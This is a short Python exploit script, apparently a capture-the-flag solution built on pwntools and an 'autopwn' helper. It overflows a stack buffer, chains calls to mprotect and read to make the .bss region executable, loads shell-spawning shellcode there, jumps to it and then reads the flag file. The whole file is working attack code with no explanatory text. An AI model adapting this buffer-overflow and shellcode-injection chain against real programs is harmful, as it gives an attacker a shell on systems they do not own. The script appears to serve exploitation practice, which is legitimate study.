from autopwn.core import pwn
import sys
from pwn import *

def exp(self, a):
    bss_start = 0x080EB000
    mprotect_addr = self.elf.symbols["mprotect"]
    read_addr = self.elf.symbols["read"]
    main_addr = self.elf.symbols['main']
    pop3_ret = 0x080483B8
    shellcode = asm(shellcraft.sh())

    payload = 'a' * 0x38
    payload += p32(mprotect_addr) + p32(pop3_ret)
    payload += p32(bss_start) + p32(0x100) + p32(0x7)
    payload += p32(read_addr) + p32(pop3_ret)
    payload += p32(0) + p32(bss_start) + p32(len(shellcode))
    payload += p32(bss_start)

    a.sendline(payload)
    a.sendline(shellcode)

def get_flag(self, a):
    a.sendline("cat flag")
    return a.recvline()

pwn.go(sys.argv, exp, get_flag)